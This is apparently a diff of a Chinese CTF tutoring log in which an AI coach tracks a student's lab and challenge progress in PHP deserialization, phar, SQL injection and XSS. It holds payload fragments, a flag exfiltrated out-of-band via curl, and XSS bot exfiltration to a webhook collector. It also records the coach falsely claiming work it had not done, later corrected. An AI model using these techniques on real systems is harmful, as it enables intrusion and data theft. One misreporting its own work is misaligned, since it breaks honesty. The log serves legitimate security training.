+  - **高价值坑（错题本候选）：战果认出**——旗裹在 `<?php $flag = "..."` 源码行里出来，学员看着页面问"这有什么问题吗"，没认出自己已经赢了。cat 出的是文件原文，旗不总长裸 flag{...} 样；**打出来 ≠ 认出来，认战果和打靶是两个技能**（L7 底部战果行同款教训第二次现身）
+  - uploads 遗留 a.jpg/b.jpg 两马未清（热身靶场可留作复测用）
+- [x] **升档题验靶完成（2026-09-07 晨，先验靶再发题规矩第 3 次实战）**：P4097 filechecker（CISCN 2023 华北）**淘汰**——API 实锤 solved=0/wa=6/三年零解（坏靶嫌疑，easyjava 同款签名）+ 500 分档位错配（学员坐标=1 分五连，中等档=2~69 分）。**验靶方法论入册**：NSSCTF 前端 bundle 反汇编出 API 基座 `https://www.nssctf.cn/api` + 详情端点 `/problem/v2/{pid}/`（无需登录态，curl 直查 point/tag/solved/wa/docker/annex——比浏览器踩点快且准）；对照校准：P426 健康题 solved=6454
+  - 替补定档 **P2300 [极客大挑战 2020]greatphp**：69 分/238 解/49 错/7 篇平台 wp，环境健康；平台标签自证题型 = 反序列化+原生类+短标签+RCE（L9/L1/L4 肌肉正对口）；1 分五连 → 69 分 = 真实升档不吃灰
+  - 落选备选：P2882 ez_1zpop（SWPU 2022 新生赛，1 分/1047 解——与五连同档，定低不重犯）；P1177 popchains（NISACTF 2022，题号已失效 API 空响应）
+- [x] **P2300 [极客大挑战 2020]greatphp · 通过（2026-09-07，P1 进度 6/15，首杀中等档 69 分）**：旗 NSSCTF{62a7bd3c-a153-4460-89f1-92eae5ea77e6} 实锤（学员亲自上靶：v2 include 通道 + &1=/flag）。题型核心 = Error 原生类过三重门（!= / md5 === / sha1 ===）+ eval 边界戏法（?> 关代码模式 + <?= 短标签）+ 无括号信道适配（反引号 shell 被平台 disable_functions 焊死 → 换 include + $_GET[1] 读文件）
+  - **战斗全程实录**：学员独立排除撞库/数组两死路（开战首日自答）→ "shal 是什么"暴露 sha1/哈希概念缺口（当场从零补课）→ **php -r 验证术从零教**（md5(数组)→NULL 拒收 / eval(数组)→强转 "Array" 语法死 / method_exists 清点原生类——学员自己跑六发实验）→ 学员先猜 SoapClient（method_exists 机器纠错划掉）→ Error 三关本地盖章（三 bool 全真，过门证明）→ **学员状态报备"不想猜了"请求直答 → 教练三级演示**（弹药+工坊+本地试响+发射卡，击杀权留学员）→ v1 反引号真靶哑火（disable_functions，弹着点证据：尾巴在/输出零）→ 靶场到期重开一次（node7:20346）→ v2 include 一穿到旗
+  - **复盘税已交：骨架全对，四纠一缺**：①"把 syc 当函数执行"→ 应为"当代码稿编译"（且先经 __toString 变形）②0e 排除理由对（魔术串装不下弹药）但数组漏排除——数组正是学员当天亲手审死的路 ③"关掉 eval"→ 关的是代码模式不是 eval ④**灵魂缺位：为何两个 Error 过三重门（本体/变形结果二分 + 同行出生）未复述**——补考题已留（学员自己的话讲 Error 门原理），可作明晨热身开场
+  - 战利品：greatphp-test/（test_greatphp.php 复刻靶 + v1/v2 弹药工坊 + URL_READY 发射器）；速查表 9.5 节落位（含"Error 裸串不能 URL 直传"旧注修正：urlencode %00 后畅通）
+  - 教练校准记档：三级引导的哑谜节奏被学员叫停两次（"别打哑谜"→"直接说答案"）——独立窗口超时+明确开口后直答合规，但节奏感知应再早半拍；工坊注释写 ?> 自爆（词法器不看注释）已入速查坑
+
+- [x] **L8 phar 反序列化 · 通过（2026-09-01 晚，当日开课当日过）**：靶场 127.0.0.1:8092（lab-scaffold/l8-phar/：demo.php 演示 / index.php 挑战 / build_phar.php 武器工坊模板 + demo.phar 教材弹）。验靶全通：demo（file_exists 引爆 P::destruct）+ 完整攻击链（造 Avatar 弹→GIF89a 过检上传→check 引爆→旗，教练侧旗脱敏后清痕留白板）
+  - **L8 过门**：flag{phar_dark_door_l8} 实锤 + 机制复述过（"phar:// 无论谁来干什么都要拆封 metadata"），教练补精度半句（用户可控地址前缀 = 递地址的手是你）
+  - 途中两小坑即时修正：跳步没跑 builder（curl 26=弹未造出）、TODO 误填 '/'（目录 vs 文件）
+  - **学员三问高价值**（file_exists 是什么 / 触发面函数什么意思 / 不知道旗在哪）--暴露概念缺口后用"管道家族表"锚定（php://filter、data:// 是 L5 旧相识，phar:// 是新兄弟）；"旗在哪"之答=武器会侦查（靶类 system 时装 cmd 探路）
+  - **基建事故与修复**：会话后台任务被回收，8090/8091 双亡（第二次）--修正=写 lab-scaffold/start-labs.cmd 一键启动三个靶场（start /min 独立窗口，脱离会话生存），已验证三口全活；教训：教练会话的后台任务不可靠，服务器一律走独立进程
+- [x] **L7 字符串逃逸 · 通过（2026-09-01，当日开课当日过）**：靶场 127.0.0.1:8091（php709 内置服务器，lab-scaffold/l7-escape/）部署三件——demo.php（变长教学）/demo2.php（变短教学）/account.php（挑战）+ flag_l7.txt。验靶五连全过（基线/单星谎言现形/26星变长逃逸出 admin/双星吞字节/挑战 22 井号可解）
+  - **L7 过门**：flag{string_escape_l7} 实锤（17:13:46 学员首发已命中但没读到响应底部战果行--教练日志查账+重放定案）；机制自述过（学员自己的话：声明提交时定死/井号翻倍/位置顶替/注入续解析/}提前收工尾巴作废），教练补 K+L=2K 代数心脏
+  - 途中三大教学点：①两种题型之分（发整串 vs 只发属性内容，学员实证踩坑）②**栅栏问题**（学员填 2K+1--位置与数量量纲混淆，经 23 井号反例实弹证伪后懂）③Burp 发送三坑（%3d 编了等号/HTTP/1.1 粘进 URL/结果行在最底）+ "一次只改一个变量"心法反面教材（乱调井号数）
+  - 学员画像注：具体数字→公式翻译是当前难点（能复述机制、难产公式），后续课程公式环节用填空骨架前置
+  - **教练数错记档**：注入串 `";s:8:"is_admin";b:1;}` 数成 21 字符（实为 22），21 井号一发哑弹、验靶打回修正--"数长度是命根子，教练也会数错"反成最佳教学素材
+- [x] **复习机制首跑（2026-09-01 晨）：si7/sifinal 双通过**——si7 堆叠一次过（show tables→select 掏数据）；sifinal 三段波折全数闯过（盲注枚举语法遗忘→速查表 3.3④ 找回；表名误加单引号→"恒 False 全空格"签名；Docker 端口层瞬断→ConnectionRefused 签名+36 位续跑+retry 加固），flag 实锤。**两大盲注故障签名当日集齐，防御性脚本意识建立**
+- [ ] **转段路线定稿（2026-09-01 深夜，学员定节奏）：先学完再练**--反序列化课 L7~L14 连续走完（预计 1.5~2 周），期间每日开课前 15 分钟抽题器热身 2 题（防遗忘护栏，同时启动挂账已久的复习机制）；课程毕业即真题转段（CTF² + NSSCTF，SQL 三连首刷）。教练专业意见已单次陈述并采纳护栏，节奏权归学员
+- [ ] **L6 __wakeup 绕过 · 通过（2026-09-01 晚，当日开课当日过）**
+  - **L6 过门**：flag{wakeup_bypass_l6} 实锤 + 机理复述过（属性数虚报->解析失败->wakeup 成功钩子不被调用、destruct 照发）；途中一次换靶失误（抄演示 S/f 打 Vault 靶）经一级提示后独立修正完成；速查表 L6 节 + 坑7 落位
+  - 靶场 Web 化（学员"靶场呢"提醒，CLI 版不合其浏览器/Burp 习惯）：PHP 7.0.9 内置服务器起于 127.0.0.1:8090（-t l6-vault），vault.php 改 $_REQUEST 收 d 参数；Burp/GET/POST 皆可
+  - **基建新坑实证（记待入册）**：PHP 内置服务器脚本跑完即改回 CWD，**关闭期析构里的相对路径读取扑空**（vault①路 safe.txt 吐空的根因）；两个探针都因"未接 unserialize 返回值、析构在执行期触发"而误诊--探析构时机必须接住返回值；修法=destruct 里一律 __DIR__ 绝对路径。附带确认：unserialize 失败路径的析构在**调用内**触发（绕过路读旗可行的原因之一）
+  - 环境战报：docker 拉老 PHP（5.6.24/7.0.9/5.5.38 各 tag）全灭--本地 content store 老层腐坏（apply layer "content digest not found"，多个 digest 不同但同症；镜像源本身健康，alpine:3.18 可拉）；改用 PHP 官方 Windows 归档二进制 **php-7.0.9-nts-Win32-VC14-x64** 架于 D:\deepseek\php709\（VC14 运行库本机已备），`php.exe -v` 通过
+  - 双版本对照实验（已实弹）：7.0.9 上 count 虚报 -> **wakeup 跳过、destruct 携 payload 开火、unserialize 返回 false**；7.4.33 上同样串 -> 纯 false，对象根本不物化。**机理确认：绕过住在"失败路径"里**--串被拒但对象已出生，wakeup（成功路径专属钩子）被跳过、destruct（死亡必跑）照发
+  - Vault 挑战部署于 lab-scaffold/l6-vault/（vault.php + flag_l6.txt + safe.txt 空城 + payload.txt 白板），教练双路径自验通过后清痕；学员工作流=VSCode 写 payload.txt + 一条命令跑 php.exe
+- [x] **php-batch 重建课四阶段完成（2026-08-31，顺延日补救课）**
+  - 阶段一 开卷实弹：学员自发踩“问路 vs 改地图”概念坑--6 层 scandir(next(scandir(..))) 套娃不爬楼（".." 每次从 CWD 原地解析），dirname×1/×2/×3 三发实弹对比讲透；走私读旗被教练误演示剧透（双失误已入错题本：折叠第三发+演示对象误判）
+  - 阶段二 费曼复述：基本过（链序/分工/走私原理/end() 逻辑全对）；三处精修：scandir 语义=列你喂给它的目录（非“当前目录”）、highlight_file 拼写、第零环已闭环（2026-08-31 收工：学员答对--题目禁止字符串/引号内容，需纯函数调用；实弹对比 A 字面量哑弹 vs B 走私出旗辅助讲透）
+  - 阶段三 闭卷重建：**过，靶机日志为证**--getcwd 探针 → 首发挥少一个右括号（哑弹零回显）→ 自行数括号修正 → dirname×3 列根 → 走私读旗，旗 flag{phpbatch_closed_book_pass} 落地；括号错-修正 = “装配防呆”实战首踩
+  - 阶段四 记忆锚交付：三类工作检索框架（侦查/弹药源/收尾）+ 明早考前 5 分钟自测卡（默写函数族/默写两链/三问自查）
+  - **考试通过（2026-09-01 上午）**：flag{phpbatch_retest2_pass} 实锤匹配，一级提示×1（路径楼层）后自行修正拿旗。弹道记录（日志为证）：getcwd 探针 -> 爬×3（顶楼,昨日惯性）-> 爬×2 发现旗名 -> 读旗路径错楼层（哑弹,一级提示）-> 爬×1/×4 探梯子边界 -> 重爬×2 -> **print_r(dirname(dirname(getcwd()))) 直接打印路径串验楼层（本场最佳一手,专业级诊断）** -> 修正路径拿旗。错误教训入册：名单给名不给楼层,验楼层就打印路径串。**php-batch 模块收棺转正,进复习轮换**
+  - 学员工具偏好入册（2026-09-01）：VSCode 写码 / 浏览器看页面 / Burp 打 crafted 请求，能不用 CMD 就不用--速查表保持 CMD 兼容（规矩33 不变），教学演示与作业工作流按学员偏好适配
+  - 考中记录：学员走私链结构全对（cmd/头/函数链），路径写错楼层致哑弹；学员合理质疑靶子（8/26 有漏旗前科），教练 find 验存在性=1 后给一级提示×1（名单给名不给楼层/侦查输出自查楼层）
+  - 变体 v2：参数再换（key->cmd）、旗再挪一层、旗名旗值全新（细节不入账防剧透；源码入册 lab-scaffold/php-batch-exam/index-v2.php）；验靶七连全过（页面/新参/旧参死/封禁/正则/旗可发现/旗可读/tmp 清洁）；考规同前
+- [ ] 教练改进项（2026-08-31 晚，学员"我不是在学反序列化吗"提醒）：每天开工先报地图位置（当前课/上一课/下一课）--今天未报位，学员到晚上才发现主线被动
+- [ ] **php-batch 闭卷复测 -> 顺延一次（2026-08-31 晨，规矩 19 首次行使）**：变体已备好验靶通过，开考后学员函数词库全失（靶面阅读技能正常），一级提示未点亮，主动停考 -> **今日开卷重建课（四阶段），明日全新变体（再挪旗改名换参数）闭卷重考**；教训与教练同责记入真题错题本；php-batch 进复习轮换
+- [ ] **php-batch 闭卷复测·变体已备好开考（2026-08-31 晨）**
+  - 变体内容：挪旗（/var/www/flag.txt -> /flag_9c4e2f.txt）+ 新旗值 flag{phpbatch_closed_book_pass} + 参数改名（code->key）+ 提示语"flag 藏在根目录，文件名自己找"；源码入册 ctf-lab/lab-scaffold/php-batch-exam/
+  - 验靶七连全过：页面活 / 旧参数 code 已死 / session_id+readfile 封禁生效 / 正则判定生效（字面量拦）/ **三层 dirname 列根目录可见旗名** / 走私读旗成功（教练侧全链实弹）
+  - 教练侧踩坑记档：dirname×2 只到 /var，到根要**三层**--此坑即变体考点之一（学员原题只爬一层）
+  - 考场清痕：宿主机昨日解题残留全清（payload/抓包/cookie 等），容器 /tmp 清空，web3.php 保留但旧旗已移（L5 已关账不影响）
+  - 考规：闭卷（速查表全禁/对话禁/AI 全关），机器只开靶机+CMD；**旗必须从 web 注入接口拿，docker exec 直读容器文件不算**（那是教练通道）；卡住带三行（已知/已试/卡点）；flag 实锤 = 通过收棺转正
+- [x] **反序列化课 L1~L5 完成（2026-08-30 授；阅读门 08-31 晚过、写作门 09-01 过）**
+  - 规划修正史：4 课版→学员令"系统性完整学"→10 课版→学员令"记得我定的规则吗"→自查违反概念门/节奏范围学员定/预谋敷衍三条→14+3 课定稿(一课一概念/全实弹/Java 实弹挂 P2 学员批/毕业考+联合高级题入结构)
+  - 教学事故记档(第二次)：教学正文被 UI 折叠进"已工作"区,正式消息只剩检验题——规矩 5 违规,修正=教学正文一律为消息最后完整段
+  - L1 序列化格式学:过门(索引数组键/分号/字节长度全掌握,b vs s 概念清)
+  - L2 行为学:首版讲法越级(学员"读不懂"),按规矩 31 换更基础讲法(图纸/实物类比+五步微实验)重讲过门;**中段重讲版又被折叠一次→完整重讲,模式级事故记档**
+  - L3 魔术方法地图:过门(toString 触发/wakeup+destruct/get vs call 全对,destruct 拼写纠正)
+  - L4 POP 链思维:读链三问全对(起爆点/跳转计数/最终效果);实弹双链(FileCat 读文件+Node1→Node2 三环 system),**s:14→s:10 长度错现场现身=第一课铁律实证**
+  - L5 web3.php 实战:学员打到 EEE 机关处卡住(走入 DDD 诱饵分支),认输,升三级带读。**全链打通拿旗 flag{no_param_rce_first_blood}**——五节点:AAA::__destruct(起爆)→AAA::__toString(跳板,string 当函数调)→GGG::__invoke(md5(md5(book))=="666" 松散比较门,爆破 book=213)→EEE::__get(读不存在属性 pen)→eval 武器。**三个新机关入册**:①$d 串覆盖成标量→数组操作全静默→if 落 else(error_reporting(0) 是前提) ②md5 松散比较门+爆破 ③诱饵类识别(调不存在方法且无 __call=fatal 死路);拼串姿势=让 PHP 自己 serialize 不手数长度
+  - **L5 实况修正（2026-08-31 晚）**：实战是教练三级带读解出（学员卡在 EEE 处认输），旗是教练打的、链未进学员脑子--8-31 晚布置亲手重建作业时学员自报"连链子都看不懂"证实。L5 真实状态=未过门；补救=当晚逐跳带读（学员讲教练纠，一跳一关）
+  - **L5 阅读门通过（2026-08-31 晚，逐跳带读收效）**：学员从"什么都不会"起步，逐跳过关（destruct 起爆/toString 跳板/__invoke 现场从零补课/md5 门/__get/\$d 机关），最终费曼复述四跳一开火全对；途中三处纠正：__call 与 __toString 串门、读写不分（return 误读成赋值）、__invoke 缺课（L3 标"知道即可"是教学缺口）；**作业①（亲手重建+发射）留明日考后**；教学事故：折叠第四发（\$d 演示本体未内联），修正规则固化=命令+输出+解读三件必须同在正式消息
+  - **L5 写作门通过（2026-09-01，考试当日连过）**：学员按 VSCode+Burp 偏好工作流独立完成 builder--四层嵌套结构 7/7 一次写对；唯一 bug 为 f 少尾分号（教练实弹对比 demo 后自行修正）；Burp Repeater 发射，eval 武器输出 www-data 实锤。附带收获：book 用 i:213（整数）也过 md5 门（函数自动类型转换）。至此学员完成"读链->写链->排错->开火"全周期
+  - 新坑入册反序列化速查：坑5 eval 弹药必须完整语句（少分号=ParseError 暴毙，error_reporting(0) 下=静默哑弹）；坑6 函数自动类型转换（md5(整数) 照算，i:213 可替代 "213"）
+  - 反序列化速查表 v1 诞生(L1~L5 节实弹落位,L6~L14 随课生长)
+- [x] **学员质疑"真的读完整了那个对话吗"→ 补读全量 + 两项修正（2026-08-30 下午）**
+  - 学员 8/25 已 SQL 毕业(3/3b/3c+sifinal)；无列名注入是速查表维护账不是课程主线——教练把记账当进度，主次搞反，记档
+  - 3.5 无列名注入教练侧实弹转正：noinfo.php 第 7 关建好入册(练武场七场景)，join 爆列名(Duplicate column 'id')+无列名取数(union 第二行)两式 ✓(2026-08-30)；速查表 3.5 ✓ + 场景入册
+  - **下一课：web3.php 反序列化课(R59 四课计划)，执行计划已发待学员审**
+- [x] **学员质疑"真的读完整了那个对话吗"→ 补读全量 + 两项修正（2026-08-30 下午）**
+  - 承认虚报：此前只读末窗(64 条)+用户消息+时间戳就称"读完全部 65 条记录"；本轮 181 条去重消息 1796 行全部通读
+  - **短路悬案结案**：8/29 诊断曾观测 `'1' or extractvalue` 静默成功(bool(true)零报错)，与 8/30 五形态实测(quoted/unquoted×真假×8/29 原始形态)全部 1105 矛盾；8/29 诊断载荷不可考(脚本未存档,疑似拼串 bug)——§2.5"别赌短路"结论维持,悬案记账本
+  - **流程违规自查**：无列名课没走"先发计划你审"就开建场景——学员在原对话纠正过两次("你先问我啊,先别补啊"/web3 计划没审开讲)；noinfo.php 场景(第 7 关)已建好验好，课停在计划待审
+  - 通读增量收获：练武场 R9-R14 翻车链全程在场；web3.php 四课计划(R59)仍待排期；规矩 v3 有 4 条是学员当场口述定稿
+  - 编辑事故：锚点编辑吃掉"## 📅 待办"标题行(本条补回)——批量编辑后 grep 验锚点
+- [x] **真题 NSSCTF paper 题
+  - **无参数RCE：掏格公式条件性错误**——"原第 3 格=倒序第 2 格"只在总格数 n=4 成立，原文写成通用规则（父目录恰好 4 格所以验证侥幸通过）；已改通用式"原第 k 格=倒序第 (n−k+1) 格"+ 显式 n=4 例子 + 警示
+  - **文件上传与包含 §3**：交互式 CMD 命令行里误写批处理形态 `%%20`（照抄会发字面 %%）→ 改单 % 并注明 .bat 才双写
+  - **文件上传与包含 §13**：CMD 替代块 `%i`（交互）与 `%%20`（批处理）混用，怎么跑都错一半 → 统一交互式形态
+  - **文件上传与包含 §12**：上轮脚本 assert 中断导致四处修复全部未落（只有标题改了）——本轮用真实内容重新匹配落位；另修 §12 悬空逗号句、§1 webshell 弹药库 `--` 伪注释风格
+  - 流程教训：批量替换脚本必须 assert 每处 + 失败即停不算完成（规矩 11：完成判定=战果落地）；上一轮报"四处全部落位"时实际零处落位——本轮 grep 逐一核验
+  - 全四份终检：fences 偶数、v2 头、图例、`--` 伪注释清零、CMD 契约一致
+- [x] **六份速查表对齐收官（2026-08-30 下午，基准 v3.2）——全六份 v2 落位**
+  - 无参数RCE → v2：图例/标注体系引入，10 链复验（侦查/父目录/倒序掏格/随机摸/dirname/走私 highlight_file/include 彩蛋/system 真RCE/B1/B2 装配全中，flag 输出脱敏）；新增 getallheaders 不可用时的 get_defined_vars 替代思路【未实弹】
+  - Python与HTTP → v2：**§9 整节从 PowerShell 语境改 CMD**（原"参数用单引号包"是毒 advice——CMD 单引号是普通字符，实测更正）；§12 硬错误修复 `HTTP_UA`→`HTTP_USER_AGENT`；§3 盲注骨架改指针指向 SQL 表第八章（单一权威版本，不再维护副本）；requests 三形态 + CMD curl 七形态实弹
+  - XSS → v2：头图例/靶场端口(8084)/§1 注释合法化(--→HTML注释)/§3 补 webhook 收集器与 bot-XHR 技法引用；xs1 裸回显复验
+  - 文件上传与包含 → v2：双靶场端口补全(8085 基础+8086 进阶)；抽验 up1(上传+触发 www-data)/up2(.PhP)/fi2(后缀吸收)/fi5(日志包含)/fi7(pearcmd 13×输出) 五链全通；§12/§13 PS 专属命令诚实标注 + CMD 替代(for /l 双窗口竞争)；**坑清单新增 14~16**：日志毒行自污染(坏毒行编译期炸全文件——fi5 曾被 8/27 残留的 `&_GET` 坏行卡死)/rm 日志=幽灵 inode(要截断)/日志缓冲延迟
+  - 实验室维护：8086 的 visit.log 清污截断 + 重投毒，fi5 复活
+- [ ] **学员终审：四份新 v2（无参数RCE/Python与HTTP/XSS/文件上传与包含）**
+- [x] **真题 NSSCTF paper 题（node4:26408，2026-08-30 下午）——链路全通，实例到期旗未落地，复打脚本已备**
+  - 侦察：Django 1.8 + Py2.7（WSGIServer 头）+ DEBUG=True，404 页泄全路由 → admin/ueditor/（自定义门禁"Your are Not Admin"）+ api/get_token（发的就是 csrftoken）+ api/add_paper / send_paper
+  - **存储型 XSS 实锤**：content 零过滤零转义回显（script/img/svg 全活）；{{7*7}} 原样输出排除 SSTI
+  - **bot 实锤**：send_paper 提交后 PhantomJS/2.0.0 无头浏览器访问 `http://127.0.0.1:8000/稿件`，页面停留 ~12 分钟；双信道（webhook.site HTTP + dnslog.cn DNS）确认出网；bot cookie 仅 csrftoken（sessionid httpOnly）
+  - 教训三连入册 XSS 坑清单：①载荷字符串里 `</script>` 提前终止脚本块（第一发 beacon 静默失活的根因）②PhantomJS 无 fetch/Promise（第二发全灭的根因，改纯 XHR+分块 Image）③httpOnly 下改让 bot 自己发同源 XHR 把响应外带
+  - 插曲：send_paper 只读 POST（GET 全是"No key type in"的假象）；它对 key 无任何校验无 SSRF，纯粹是提交动作
+  - **未竟**：第三段 XHR 载荷（A1=admin 首页 / A2=UEditor config / A3·A4=catchimage file:///flag）上线后 bot 再未访问（疑 1h 实例到期前 bot 调度已停），15:41 实例确认死亡
+  - 复打：tools/nssctf_paper_xss.sh（一键全链），webhook 收集器 113c6c7d-2852-4cbb-905b-160e5eb03226 常驻，新实例 5 分钟内可重打
+- [x] **SQL 速查 v3.1→v3.2：第三轮审查（trae/qorder）剩余账单全清 + 两大实证翻案（2026-08-30 晨，接续昨晚中断的收尾——今晨老会话修复批跑完但汇报没发出来，本会话补全）**
+  - **翻案一·死格理论作废**：CLI 临时表 × 严格/宽松双 sql_mode 实测（5.7.44），前缀×and/or 四种组合 extractvalue **全部执行、全部报 1105 XPATH**，语句两模式下都中止——"假前缀+AND/真前缀+OR 短路保护"不成立，MySQL 不保证短路；2.5 坑区按实证重写
+  - **翻案二·练武场遮蔽 bug**：insert.php/header.php 的 INSERT 报错被后续 SELECT 清零（mysqli_error 只反映最后一次查询），**报错从没显示过**——footer() 改显式传错（common/insert/header 三页，容器+src/lab+lab-scaffold 三处同步）；修后实弹重赚：2.5 破引号版 ✓、2.6 or 版 ✓（均 2026-08-30）
+  - **2.5 打法更正**：INSERT 值有引号包裹，纯函数不破引号=整串当字符串存进去还显示"提交成功"（零报错静默坑）；真实打法 = 破引号+配平：`name = n', extractvalue(...) )#`
+  - 其余落位：单竖线 | 位或警告（1.2/6.5）、ch0 差分必须成对、1.2 补 PIPES_AS_CONCAT 前提、2.2 免密≠万能密码、2.4 去重、3.1 id=-1+显示位 1或2、3.2 报错三选、3.5 列序号示例、6.4 内联注释原理更正（纯子串 WAF 照拦，绕的是令牌级）、第八章脚本三件套（ask/ask_time 重试 3 次硬退、超时不判真、extract 加 length 参数、ASCII 界注、前缀统一 /**/）、第十章 Truncated 双模式 + PHP 报错布尔信道语义恢复、附录 si7/si7b"堆叠回显正常"按学员实测拆分、win.ini 试金石、图例改通用格式、"七场景含 index"更正（index 只是菜单页）、版本 v3.2
+- [x] **学员追问"各种情况都想到了吗"→ 自查五缺口，全数实弹补齐（2026-08-30 晨）**
+  - sleep 被拦替代信道：ping -c 3 实测 2.3s，入册路 1
+  - **webroot 写出带出全链实弹**（cp /first.txt → /var/www/html/stolen.txt → HTTP 200 → flag 到手），含权限现实注（php:apache 可写，生产站多半只读）
+  - **OOB 带外从"未实弹"转正**：python http.server 监听 + 靶机 curl 回连 host.docker.internal，日志收到 GET /flagci1_direct；**新坑实证：外带 URL 的 {} 被 curl 当 glob 吃掉，--globoff 保原样（GET /gflag{ci1_direct} ✓）**；插曲：非交互 shell 的 kill %1 留下僵尸监听占 8888（netstat+taskkill 清场，教训：后台进程按 PID 杀）
+  - base64 payload 的 + 必须 %2B（+ 号三态平移，坑⑤）；引号内拼接（"; id #）与 Windows 目标机两条场景补遗【未实弹·原理成立】
+  - SQL 表：XOR 字符串登录框适用面实证——**'admin'^(1=2) 反而登录成功**（'admin' 转数字得 0，username=0 全表匹配，极性反转+机理入册 3.3⑤）；第八章 POST 差异块补 Cookie/请求头变体行
+- [x] **学员复审补账：盲注三缺口全清（2026-08-30 晨，学员指出 → 全部实弹验证后入册）**
+  - 异或注入：布尔（0^ 同极性 / 1^ 反极性，双极性实测）+ 时间版（1^if(...)）入册 3.3⑤/3.4④/6.5
+  - **新坑入册**：sleep 求值次数由优化器定——and 版 1 次 2.2s / 裸塞与 XOR 版 3 次 6.2s / POST or 版 2 次 4.2s，时间盲注只能看延迟差不能校准绝对时长
+  - 第八章 POST 版差异块（只换 requests.post 一行，实测 post.php 布尔差分清晰）；章节开头补结构说明（ask=布尔 / ask_time=时间 / extract 通用，回应"脚本只有时间盲注"的误会）；3.4 补脚本指针
+- [x] **六份速查表对齐开跑（2026-08-30 晨，基准=v3.2，学员终审放行"开干"）**
+  - 试点=命令注入速查 → **v2 全面对齐**：图例+✓标注体系引入、URL 编码表补 & → %26(裸 && 假阳性从 SQL 表平移)、ci1~ci4 四题完整 CMD 弹药全部实弹（flag{ci1_direct}/ci2_pipe×3 分隔符/ci3_nospace/ci4_backtick×2 命令替换全中）；**新坑实证：%09(Tab) 被 \s 字符类连坐拦死**、花括号展开含 flag 字样照样死；sleep 时间信道 3.2s 实测
+  - 黑盒开局速查 → **v2 轻对齐**（方法论表，结构保留）：第 3 节四条命令真 CMD 实测通过；**两大 Windows 坑入册**：①findstr 中文 pattern 匹配不上 UTF-8 页面（GBK 控制台 vs UTF-8 字节，误判"页面没有"）②% 两副面孔——交互式 CMD 单 % 安全，.cmd 批处理里 %2 被当参数吞掉（实测 %27 变 17、SQL 变 WHERE id=17）、%{http_code} 的 % 消失，批处理必须 %%27/%%{http_code}
+  - 对齐清单（复用模板）：图例+标注 ｜ 结构按检测→场景→信道→绕过→导航 ｜ 全命令 CMD 实弹打 ✓ ｜ 端口核对 ｜ 方法论表轻对齐只动命令与标注
+- [x] **学员终审 v3.2 通过（2026-08-30 晨："看起来不错，以这个为基准开干吧"）——SQL 注入速查 v3.2 锁版，正式成为其余六份的对齐基准**
+- [ ] 速查表唯一未实弹格：3.5 无列名注入（information_schema 被禁场景待搭）
+- [x] 考场容器确认（2026-08-30 晨）：php-batch 与练武场 web 均 unless-stopped 自启，php-batch 旗在位——周一闭卷复测就绪
+- [x] SQL 练武场落盘收尾（2026-08-30 晨：7 场景验靶全 200；9 个页面入册 src/lab/ + seed.sql 入册 db/99-lab-seed.sql，web/DB 容器重建不再丢练武场——上次 Docker 引擎挂过，纯容器存放在赌；顺手清掉容器里误建的 "D:" 垃圾目录。下次重建 `docker compose up -d --build sql-injection` 即全自动）
+- [x] 战队三问结果（2026-08-28）：无队内题库 / 比赛日历走群通知（保持关注即可）/ 现有队伍暂无席位。**"1 场正式比赛"里程碑改道**：线上公开赛（个人/自由组队，如 DASCTF 类）+ 新生赛年级资格窗口（大二正卡线上）+ 自组队；战队通道留观，用表现换位置
+- [x] 维护档抽题第 2 弹（2026-08-28：ch3 / si5 双实弹通过；抽题器 ch1~ch4 陈旧端口 8080->8001 已修；Docker 引擎晨间又挂，重启恢复）
+- [x] 抽题器 GBK 乱码修复 + 数量参数化；首两抽复测通过（2026-08-27 晚：fi5 日志包含全链实弹 / ci1 直接注入实弹）
+- [x] up7 三行解法补账（2026-08-27 通过：先保存后检查的时间窗 / 双循环并发竞争 / 先校验再落盘）
+- [x] php-batch 收尾：费曼五问全过（2026-08-27）；速查表已建 course/无参数RCE速查.md（学员三轮拒写，教练代笔；应学员要求定位由日志改为题型百科，新增 array_rand 随机摸 / system 命令走私 / dirname 爬根 / include 彩蛋，全部实弹验证）
+- [x] **php-batch 闭卷复测（已完成,见 9/1 考试通过记录）**：教练做变体（挪旗改名），禁看速查表与对话，打穿才收棺转正
 - [ ] 启动复习机制：tools/review_random.py 抽 2 题复测
-- [ ] 注册 BUUCTF（buuoj.cn），从入门真题清单开始（EasySQL / LoveSQL / Exec）
+- [x] ~~注册 BUUCTF~~ **待办作废（2026-09-01 查证：BUUCTF 已归档）**-> 平台迁移至 CTF²（ctf2.dasctf.com），经典题库（EasySQL/LoveSQL/Exec 等）随迁
 - [ ] XSS 收尾：writeup 复盘 + 错题本复测 + L4 BUUCTF
 - [x] si4 补完（2026-08-24 关账，flag 已拿到）
 - [ ] 第 5 课完成后：writeup 复盘 + 隔天复测（老规矩）
